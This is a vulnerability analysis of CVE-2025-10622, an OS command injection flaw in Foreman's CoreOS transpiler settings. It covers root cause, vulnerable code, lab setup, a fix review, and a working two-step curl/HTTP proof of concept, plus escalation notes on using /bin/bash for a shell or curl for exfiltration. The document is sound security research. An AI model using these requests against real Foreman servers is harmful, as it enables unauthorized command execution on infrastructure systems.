# Vulnerability Analysis: CVE-2025-10622

## Executive Summary

CVE-2025-10622 is an OS command injection vulnerability in Foreman (component of Red Hat Satellite) versions 3.12.0 through 3.16.0. An authenticated user with `edit_settings` permission (admin by default) can set the CoreOS transpiler path (`ct_location` or `fcct_location`) to any arbitrary executable on the system via the REST API or GraphQL, bypassing client-side-only whitelist restrictions. When a provisioning template subsequently invokes the transpiler macro, the attacker-controlled binary is executed with `Open3.capture3`, achieving arbitrary command execution as the Foreman process user.

---

## Root Cause

**CWE-78: OS Command Injection** combined with **CWE-602: Client-Side Enforcement of Server-Side Security**.

The `ct_location` and `fcct_location` settings define the filesystem path to the CoreOS transpiler binaries. The settings are defined in `config/initializers/f_foreman_settings_provisioning.rb` with a `collection` parameter that restricts choices in the UI dropdown:

```ruby
setting('ct_location',
  type: :string,
  default: CT_LOCATIONS.first,         # /usr/bin/ct
  collection: proc { CT_LOCATIONS.zip(CT_LOCATIONS).to_h })  # CLIENT-SIDE ONLY
```

The `collection` parameter only populates a UI dropdown — it creates **no server-side validation**. The whitelisted paths are:
- `CT_LOCATIONS = %w(/usr/bin/ct /usr/local/bin/ct)`
- `FCCT_LOCATIONS = %w(/usr/bin/fcct /usr/local/bin/fcct)`

When an API call (`PUT /api/v2/settings/ct_location`) or GraphQL mutation (`UpdateSettingMutation`) sets the value to any arbitrary path (e.g., `/usr/bin/id`), the server accepts and persists it without validation.

Later, when a provisioning template calls `transpile_coreos_linux_config()` or `transpile_fedora_coreos_config()`, the setting is read, assembled into a command array, and passed to `Foreman::CommandRunner`, which executes it via `Open3.capture3`.

The `CommandRunner` only validates that the path is:
1. An absolute path
2. Exists on the filesystem
3. Is executable

These checks are insufficient — they allow any system binary (e.g., `/usr/bin/id`, `/usr/bin/curl`, `/bin/bash`) to be used as the "transpiler".

---

## Vulnerable Files and Functions

### 1. Setting Definition (no server-side validation)
- **File**: `config/initializers/f_foreman_settings_provisioning.rb`
- **Lines**: 123-128 (`ct_location`), 134-139 (`fcct_location`)
- **Issue**: `collection:` only restricts UI dropdown, not API/GraphQL input

### 2. Template Macros (command construction and execution)
- **File**: `app/services/foreman/renderer/scope/macros/transpilers.rb`
- **Line 18**: `ct_command = [Setting[:ct_location]] + Setting[:ct_arguments]`
- **Line 19**: `result = Foreman::CommandRunner.new(ct_command, input).run!`
- **Line 33**: `fcct_command = [Setting[:fcct_location]] + Setting[:fcct_arguments]`
- **Line 34**: `Foreman::CommandRunner.new(fcct_command, input).run!`
- **Issue**: Reads attacker-controlled setting value and passes it directly to command execution

### 3. Command Execution Wrapper
- **File**: `lib/foreman/command_runner.rb`
- **Line 36**: `Open3.capture3(*cmd, stdin_data: indata)`
- **Issue**: Executes whatever binary path is provided, only checking it exists and is executable

### 4. API Endpoint (no input validation)
- **File**: `app/controllers/api/v2/settings_controller.rb`
- **Line 56**: `@setting = Foreman.settings.set_user_value(@setting.name, value)`
- **Issue**: Accepts any string value for any setting, no per-setting validation

### 5. GraphQL Mutation (no input validation)
- **File**: `app/graphql/mutations/settings/update.rb`
- **Line 31**: `record = Foreman.settings.set_user_value(definition.name, params[:value])`
- **Issue**: Same as API — accepts arbitrary value

---

## Triggering Input

### Step 1: Set ct_location to a malicious path

**Via REST API:**
```http
PUT /api/v2/settings/ct_location HTTP/1.1
Host: foreman.example.com:3000
Content-Type: application/json
Authorization: Basic <admin_credentials_base64>

{"setting": {"value": "/usr/bin/id"}}
```

**Via GraphQL:**
```graphql
mutation {
  updateSetting(input: { name: "ct_location", value: "/usr/bin/id" }) {
    setting { name value }
    errors { path message }
  }
}
```

The server responds with HTTP 200 and the setting is persisted in the database.

### Step 2: Trigger template rendering

The `transpile_coreos_linux_config()` macro is called when:
1. A provisioning template containing `<%= transpile_coreos_linux_config(config) %>` is rendered
2. This happens during:
   - Host provisioning for CoreOS/Flatcar/FedoraCoreOS operating systems (automatic)
   - Template preview via the Foreman UI or API (manual)
   - Any custom template that calls the macro

The built-in template at `app/views/unattended/provisioning_templates/provision/coreos_provision.erb` (line 64) calls:
```erb
<%= transpile_coreos_linux_config(config) %>
```

**To trigger via template preview (requires `edit_provisioning_templates` or equivalent permission):**
```http
POST /provisioning_templates/preview HTTP/1.1
Host: foreman.example.com:3000
Content-Type: application/x-www-form-urlencoded
Authorization: Basic <admin_credentials_base64>

template=<%25%3D+transpile_coreos_linux_config("---\ntest: foo")%25>&preview_host_id=1
```

### Step 3: Command execution

The attacker-controlled binary (`/usr/bin/id`) is executed by `Open3.capture3` with the template input as stdin. The output (e.g., `uid=1001(foreman) gid=0(root) groups=0(root)`) is returned in the template rendering result.

---

## Attack Scenario

1. **Prerequisites**: Attacker has a valid Foreman account with `edit_settings` permission (admin role by default)
2. **Step 1**: Attacker sends `PUT /api/v2/settings/ct_location` with `{"setting": {"value": "/usr/bin/id"}}` — server accepts it
3. **Step 2**: Attacker triggers template rendering that invokes `transpile_coreos_linux_config()`:
   - Option A: Preview a template containing the macro call
   - Option B: Wait for/trigger host provisioning for a CoreOS host
   - Option C: Create a custom template that calls the macro
4. **Step 3**: The command executes as the Foreman process user (typically `foreman` with `gid=0`)
5. **Escalation**: For full RCE, set `ct_location` to `/bin/bash` and provide a script as the template input (via stdin), or use `/usr/bin/curl` to exfiltrate data

**Alternative targets:**
- `/usr/bin/id` — prove execution, leaks process user info
- `/usr/bin/whoami` — leaks username
- `/bin/bash` — full shell (stdin data from template becomes the script)
- `/usr/bin/curl` — network exfiltration
- `/usr/bin/python3` — script execution via stdin

---

## Impact

- **Confidentiality: HIGH** — Attacker can read arbitrary files accessible to the Foreman process user, including database credentials, API secrets, and host provisioning data
- **Integrity: HIGH** — Attacker can modify files, inject backdoors into provisioning templates, or alter host configurations
- **Availability: HIGH** — Attacker can crash the service, delete data, or disrupt provisioning workflows
- **Scope: CHANGED** — Foreman manages infrastructure provisioning; compromising it gives access to managed hosts, Satellite servers, and connected infrastructure
- **CVSS 3.1**: 8.0 (HIGH) — AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
- **Attack Complexity: HIGH** because it requires admin-level access (`edit_settings` permission)

This also **bypasses Foreman's safe mode rendering** — even with `safemode_render=true`, the transpiler macros are allowlisted and will execute the command.

---

## Fix Assessment

### The Fix (commit 49dd22221ed4ba4d7687e3e7406d8ae975a2ffa9)

Added two server-side validation rules in `config/initializers/f_foreman_settings_provisioning.rb`:

```ruby
validates('ct_location', ->(value) { value.blank? || CT_LOCATIONS.include?(value) },
  message: N_("Invalid ct location, use settings.yaml for arbitrary location"))
validates('fcct_location', ->(value) { value.blank? || FCCT_LOCATIONS.include?(value) },
  message: N_("Invalid fcct location, use settings.yaml for arbitrary location"))
```

### Assessment: Fix is EFFECTIVE for the primary attack vector

**Strengths:**
- Server-side validation using the same whitelist constants (`CT_LOCATIONS`, `FCCT_LOCATIONS`)
- Validation applies to both REST API and GraphQL mutations (via the shared `Setting` model validation)
- Uses strict `include?` check — no regex/pattern matching that could be bypassed
- Allows blank value (safe — would fail at `CommandRunner` with "command not found")

### Potential Remaining Concerns (NOT bypasses of the fix itself):

1. **`ct_arguments` / `fcct_arguments` are NOT validated**: These array-type settings accept arbitrary strings and are appended to the command array. While they are passed as *arguments* (not the binary path) to `Open3.capture3`, and `capture3` with array form doesn't use a shell, they could potentially influence the behavior of the whitelisted `ct`/`fcct` binaries in unexpected ways. However, this is a much weaker vector since the binary itself is now constrained.

2. **`settings.yaml` bypass path**: The fix error message explicitly mentions `use settings.yaml for arbitrary location`. If an attacker can write to `settings.yaml` on the filesystem, they can bypass the validation. This is by design (file access implies higher privilege).

3. **No validation on the `CommandRunner` itself**: The fix is at the settings layer only. If another code path constructs a `CommandRunner` with user input, the same class of vulnerability exists. However, currently only the transpiler macros use `CommandRunner` with setting-derived paths.

4. **Similar patterns**: No other settings in the provisioning configuration follow the same `collection`-only pattern for executable paths. The `ct_location`/`fcct_location` settings are unique in this regard.

---

## Build System & Lab Requirements

### Build System
- **Language**: Ruby on Rails 7.0.x application
- **Package Manager**: Bundler (Gemfile) + npm (webpack for frontend)
- **Container Build**: Multi-stage Dockerfile based on `quay.io/centos/centos:stream9`

### Build Commands
```bash
# Using the existing Dockerfile (recommended)
docker build -t foreman:3.16.0 .

# Or using pre-built image
# quay.io/foreman/foreman:develop (may not have vulnerable version)
```

### Dependencies
| Component | Version | Purpose |
|-----------|---------|---------|
| Ruby | >= 2.7 | Application runtime |
| Rails | ~> 7.0.3 | Web framework |
| Bundler | >= 2.0 | Gem dependency management |
| Node.js | >= 22 | Frontend build (webpack) |
| PostgreSQL | >= 12 | Database |
| Redis | latest | Cache + Dynflow task queue |
| `open3` | stdlib | Command execution (vulnerable path) |
| `safemode` gem | >= 1.4 | Template sandboxing |

### Runtime Requirements
1. **PostgreSQL database** — `postgres:12` image, user/pass `foreman/foreman`
2. **Redis (cache)** — `redis` image, used for Rails caching
3. **Redis (tasks)** — `redis` image with persistence, used for Dynflow/Sidekiq
4. **Foreman app** — Rails server on port 3000
5. **Admin user** — seeded via `SEED_ADMIN_USER` / `SEED_ADMIN_PASSWORD` env vars (defaults to `admin` with random password)
6. **Database initialization** — `bundle exec rails db:create db:migrate db:seed`

### Docker Compose (from repository)
The repository includes a `docker-compose.yml` with 6 services:
- `db` (PostgreSQL 12)
- `app` (Foreman Rails server, port 3000)
- `orchestrator` (Sidekiq orchestrator worker)
- `worker` (Sidekiq worker)
- `redis-cache` (Redis for caching)
- `redis-tasks` (Redis for task queue)

### Lab Environment Setup
```bash
# Build the vulnerable version
git checkout 3.16.0
docker compose build

# Start services
docker compose up -d

# Initialize database and seed admin user
docker compose exec app bundle exec rails db:create db:migrate db:seed SEED_ADMIN_PASSWORD=changeme

# Foreman is now accessible at http://localhost:3000
# Login: admin / changeme
```

### Key Environment Variables
```
DATABASE_URL=postgres://foreman:foreman@db/foreman?pool=5
RAILS_ENV=production
FOREMAN_FQDN=foreman.example.com
FOREMAN_DOMAIN=example.com
FOREMAN_RAILS_CACHE_STORE_TYPE=redis
FOREMAN_RAILS_CACHE_STORE_URLS=redis://redis-cache:6379/0
DYNFLOW_REDIS_URL=redis://redis-tasks:6379/0
SEED_ADMIN_USER=admin
SEED_ADMIN_PASSWORD=changeme
```

---

## PoC Strategy

### Simplest PoC (2-step API attack):

1. **Set `ct_location` to `/usr/bin/id`:**
```bash
curl -k -u admin:changeme -X PUT \
  -H "Content-Type: application/json" \
  -d '{"setting": {"value": "/usr/bin/id"}}' \
  https://foreman.example.com/api/v2/settings/ct_location
```

2. **Trigger template preview with transpiler macro:**
```bash
curl -k -u admin:changeme -X POST \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= transpile_coreos_linux_config(\"---\\ntest: true\") %>", "preview_host_id": 1}' \
  https://foreman.example.com/provisioning_templates/preview
```

The response body will contain the output of `/usr/bin/id` (e.g., `uid=1001(foreman) gid=0(root)`).

### Verification of Fix:
After applying the fix, step 1 should return an HTTP 422 error:
```json
{"error": {"message": "Invalid ct location, use settings.yaml for arbitrary location"}}
```

### Alternative trigger (no template preview needed):
If template preview is not accessible, provisioning a CoreOS host will also trigger the macro. But template preview is simpler for PoC purposes.

### Note on Template Preview
Template preview may require a host to exist in the database for rendering context. The PoC script should:
1. Create a minimal host entry (or use an existing one)
2. Or use a simpler template that doesn't require host context
3. Or directly test the setting validation bypass (step 1 alone proves the vulnerability)
